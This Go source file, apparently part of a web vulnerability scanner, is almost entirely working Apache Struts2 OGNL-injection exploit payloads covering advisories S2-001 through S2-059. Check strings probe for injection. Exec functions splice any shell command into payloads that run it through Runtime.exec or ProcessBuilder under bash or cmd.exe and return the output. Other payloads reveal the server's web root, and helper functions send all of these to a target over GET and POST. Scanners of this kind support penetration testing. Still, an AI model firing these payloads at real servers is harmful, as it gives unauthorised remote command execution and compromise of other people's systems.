package utils

import (
	"crypto/md5"
	"fmt"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

var (
	Vnlist          = [...]string{"struts2-001", "struts2-005", "struts2-007", "struts2-008", "struts2-009", "struts2-012", "struts2-013", "struts2-015", "struts2-016", "struts2-045", "struts2-046", "struts2-048", "struts2-053", "struts2-057"}
	Checkflag       = CreateHash("ST2SG")
	Timeout         = time.Second * 3
	GlobalUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"

	POC_s001_webpath = "%25%7b%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()%2c%23response%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2c%23response.println(%27s001webpathstart%27%2b%23req.getRealPath(%27%2f%27)%2b%27s001webpathend%27)%2c%23response.flush()%2c%23response.close()%7d"
	POC_s005_webpath = "?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
	POC_s016_webpath = "?redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
	POC_s045_webpath = "%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#analysis['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcldedClasses().clear()).(#analysis.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath(\"/\"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
	POC_s046_webpath = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#analysis['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#analysis.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('web')).(#res.getWriter().print('path:')).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath('/'))).(#res.getWriter().flush()).(#res.getWriter().close())}\x00b"

	POC_s001_check = "%25%7B3154%2B3154%7D"
	POC_s005_check = POC_s005_exec("echo%20" + Checkflag)
	POC_s007_check = "%27%2B%28%23%7B3154%2B3154%7D%29%2B%27"
	POC_s008_check = POC_s008_exec("echo%20" + Checkflag)
	POC_s009_check = POC_s009_exec("name", "echo%20"+Checkflag)
	// POC_s012_check = "%25%7B3154%2B3154%7D"    //表达式判断法，需要获取一下location
	POC_s012_check = POC_s012_exec("echo " + Checkflag)
	POC_s013_check = "?test=%24%7B3154%2b3154%7D"
	POC_s015_check = "/$%7B(3154+3154)%7D.action"
	POC_s016_check = "?redirect%3A%24%7B3154%2B3154%7D" // 表达式判断需获取location
	// POC_s016_check = "?redirect:$%7b%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28%22"+Checkflag+"%22%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29%7d"
	POC_s045_check = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#analysis['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#analysis.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('" + Checkflag + "')).(#res.getWriter().flush()).(#res.getWriter().close())}"
	POC_s046_check = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#analysis['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#analysis.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('" + Checkflag + "')).(#res.getWriter().flush()).(#res.getWriter().close())}\x00b"
	POC_s048_check = "%24%7B3154%2B3154%7D"
	POC_s053_check = "%25%7B3154%2B3154%7D%0D"
	// POC_s057_check = "/%24%7B3154%2b3154%7D"
	POC_s057_check = "/%24%7B3154%2B3154%7D"
	POC_s059_check = "%25%7B3154*3154%7D"
)

func POC_s001_exec(command string) string {
	return "%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%22" + command + "%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b100%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(%22s001execstart%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().println(%22s001execend%22)%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d"
}
func POC_s005_exec(command string) string {
	url.QueryEscape(command)
	return "?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27" + command + "%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte[16384]%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29"
}
func POC_s007_exec(command string) string {
	return "s007execstart%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27" + command + "%27%29.getInputStream%28%29%29%29+%2B+%27s007execend"
}
func POC_s008_exec(command string) string {
	command = url.QueryEscape(command)
	return "?debug=command&expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27" + command + "%27%29.getInputStream%28%29%29%29"
}
func POC_s009_exec(param string, command string) string {
	return "?" + param + "=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27" + command + "%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[20000],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(" + param + ")(%27meh%27)]"
}
func POC_s012_exec(command string) string {
	command = parseCommand(command)

	return "%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B" + command + "%7D)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b20000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(%22s012execstart%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d"
}
func POC_s013_exec(command string) string {
	command = url.QueryEscape(command)
	return "?test=%24%7b%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%27" + command + "%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b20000%5d%2c%23c.read(%23d)%2c%23out%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23out.println(new+java.lang.String(%23d))%2c%23out.close()%7d"
}
func POC_s015_exec(command string) string {
	return "/%24%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23m%3d%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2c%23m.setAccessible(true)%2c%23m.set(%23_memberAccess%2ctrue)%2c%23q%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27" + command + "%27).getInputStream())%2c%27s015execstart%27%2b%23q%2b%27s015execend%27%7d.action"
}
func POC_s016_exec(command string) string {
	command = url.QueryEscape(command)
	return "?redirect:$%7b%23req%3d%23co%6etext.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23s%3dnew%20java.util.Scanner%28%28new%20java.lang.%50rocessBuilder%28%27" + command + "%27.toString%28%29.split%28%27%5C%5Cs%27%29%29%29.start%28%29.getInputStream%28%29%29.useDelimiter%28%27%5C%5CAAAA%27%29,%23str%3d%23s.hasNext%28%29?%23s.next%28%29:%27%27,%23resp%3d%23co%6etext.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.println%28%23str%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29%7d"
}
func POC_s045_exec(command string) string {
	return "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#analysis['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#analysis.setMemberAccess(#dm)))).(#cmd='" + command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
}
func POC_s046_exec(command string) string {
	return "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#analysis['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#analysis.setMemberAccess(#dm)))).(#cmd='" + command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
}
func POC_s048_exec(command string) string {
	return "%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3d%27s048execstart%27%2b%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27" + command + "%27).getInputStream())%2b%27s048execend%27).(%23q)%7d"
}
func POC_s053_exec(command string) string {
	return "%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27" + command + "%27).(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%27s053execstart%27%2b%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream())%2b%27s053execend%27)%7d"
}
func POC_s057_exec(command string) string {
	return "/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.analysis%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27" + command + "%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
}

func POC_s059_exec(command string) string {
	return "%25%7B%0A%28%23dm%3D%40ognl%2EOgnlContext%40DEFAULT%5FMEMBER%5FACCESS%29%2E%0A%28%23ct%3D%23request%5B%27struts%2EvalueStack%27%5D%2Econtext%29%2E%0A%28%23cr%3D%23ct%5B%27com%2Eopensymphony%2Exwork2%2EActionContext%2Econtainer%27%5D%29%2E%0A%28%23ou%3D%23cr%2EgetInstance%28%40com%2Eopensymphony%2Exwork2%2Eognl%2EOgnlUtil%40class%29%29%2E%0A%28%23ou%2EsetExcludedPackageNames%28%27%27%29%29%2E%28%23ou%2EsetExcludedClasses%28%27%27%29%29%2E%0A%28%23ct%2EsetMemberAccess%28%23dm%29%29%2E%0A%28%23a%3D%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%27id%27%29%29%2E%0A%28%27s050execstart%27%2B%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%23a%2EgetInputStream%28%29%29%2B%27s059execend%27%29%0A%7D"
}

func parseCommand(command string) string {
	// 此函数功能是处理命令执行时的空格，有些漏洞需要处理
	// 比如将原始输入：ls -la 处理为："ls","-la"
	finalCmd := ""
	tmpCmd := strings.Split(command, " ")
	// fmt.Println(tmpCmd)
	for _, sCmd := range tmpCmd {
		finalCmd += "\"" + sCmd + "\"" + ","
	}
	finalCmd = strings.TrimRight(finalCmd, ",")
	return finalCmd
}

func CreateHash(s string) string {
	t := time.Now()
	h := md5.New()
	io.WriteString(h, s)
	io.WriteString(h, t.String())
	v := fmt.Sprintf("%x", h.Sum(nil))
	return v
}

func IfContainsStr(rspBody string, clearFlag string) bool {
	return strings.Contains(rspBody, clearFlag)
}

func GetBetweenStr(str, start, end string) string {
	n := strings.Index(str, start)
	if n == -1 {
		n = 0
	}
	str = string([]byte(str)[n:])
	m := strings.Index(str, end)
	if m == -1 {
		m = len(str)
	}
	str = string([]byte(str)[:m])
	return str
}
func PostFunc4Struts2(pUrl string, postData string, contentType string, st2Payload string) string {
	postData = strings.Replace(postData, "fuckit", st2Payload, 1)

	var headers = make(map[string]string)

	if contentType != "" {
		headers["Content-Type"] = st2Payload
	}
	resp, err := httpx.Request(pUrl, "POST", postData, headers, "Poc S2")
	if err != nil {
		return ""
	}

	return resp.Body
}

func GetFunc4Struts2(pUrl string, getParam string, st2Payload string) string {
	pUrl += st2Payload
	resp, err := httpx.Get(pUrl, "Poc s2")
	if err != nil {
		return ""
	}
	return resp.Body
}
func Get302Location(targetUrl string) string {
	resp, err := http.Head(targetUrl)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	return resp.Request.URL.String()
}
